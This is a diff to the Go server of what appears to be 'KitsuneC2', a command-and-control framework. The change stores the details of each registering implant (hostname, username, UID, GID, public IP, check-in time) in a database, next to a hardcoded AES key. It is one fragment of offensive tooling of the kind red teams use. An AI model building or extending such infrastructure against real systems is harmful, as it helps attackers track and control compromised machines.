@@ -4,9 +4,11 @@ package main
 
 import (
 	"KitsuneC2/lib/communication"
+	"KitsuneC2/server/db"
 	"fmt"
 	"log"
 	"net"
+	"time"
 )
 
 // we use some clever reflection design so that we do not have to make a huge switch statement containing all possible messageTypes.
@@ -22,8 +24,7 @@ var messageTypeToFunc = map[int]func(net.Conn, interface{}){
 // done.
 func tcpHandler(conn net.Conn) {
 	defer conn.Close()
-	implantId, messageType, data, err := communication.ReceiveEnvelopeFromImplant(conn, []byte("thisis32bitlongpassphraseimusing")) //TODO: change aes key to a proper one :)
-	log.Printf("It's working! ImplantId: %s", implantId)
+	_, messageType, data, err := communication.ReceiveEnvelopeFromImplant(conn, []byte("thisis32bitlongpassphraseimusing")) //TODO: change aes key to a proper one :)
 	if err != nil {
 		log.Printf("[ERROR] Could not understand message sent by implant. Reason: %s", err.Error())
 		return
@@ -43,7 +44,23 @@ func handleImplantRegister(conn net.Conn, data interface{}) {
 		log.Printf("[ERROR] Received envelope with messageType=0 (ImplantRegister), but could not convert envelope data to ImplantRegister datastructure")
 		return
 	}
-	fmt.Println(implantRegister.UID)
+
+	var dbEntry *db.Implant_info = new(db.Implant_info)
+	dbEntry.Id = implantRegister.ImplantId
+	dbEntry.Name = implantRegister.ImplantName
+	dbEntry.Hostname = implantRegister.Hostname
+	dbEntry.Username = implantRegister.Username
+	dbEntry.Uid = implantRegister.UID
+	dbEntry.Gid = implantRegister.GID
+	dbEntry.Public_ip = conn.RemoteAddr().String()
+	dbEntry.Last_checkin = int(time.Now().Unix())
+	dbEntry.Os = ""          //TODO
+	dbEntry.Arch = ""        //TODO
+	dbEntry.Session_key = "" //TODO
+	err := db.AddImplant(dbEntry)
+	if err != nil {
+		log.Printf("[ERROR] could not register implant with ID: %s (%s). Reason: %s", dbEntry.Id, dbEntry.Public_ip, err)
+	}
 }
 
 // Handles envelopes with messageType==1. Every x amount of time, an implant sends a check-in message which this function handles.
